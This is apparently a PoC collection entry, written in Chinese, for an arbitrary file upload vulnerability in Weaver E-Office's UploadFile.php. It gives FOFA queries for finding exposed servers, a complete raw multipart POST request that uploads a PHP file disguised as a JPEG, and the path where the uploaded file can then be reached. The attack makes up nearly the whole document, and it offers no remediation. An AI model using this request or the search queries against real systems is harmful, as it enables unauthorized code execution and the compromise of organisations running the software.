## 泛微E-Office-uploadfile.php任意文件上传漏洞

## fofa
```
(body="login.php"&&body="eoffice")||body="/general/login/index.php"
icon_hash="1578525679"
```


## poc
```
POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
Content-Length: 193
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: image/jpeg

<?php phpinfo();?>
--e64bdf16c554bbc109cecef6451c26a4--
```

![64b885a2ae7aa10cf5b5773c0495b7b3](https://github.com/wy876/POC/assets/139549762/e67a6a19-1034-430b-8f13-995aaf7c6e0f)

文件上传路径

`/images/logo/logo-eoffice.php`

![7955aa06c40c915e09ea9609e52cba8f](https://github.com/wy876/POC/assets/139549762/ad038d5e-0d77-4ae2-b1cf-f41988bde59a)
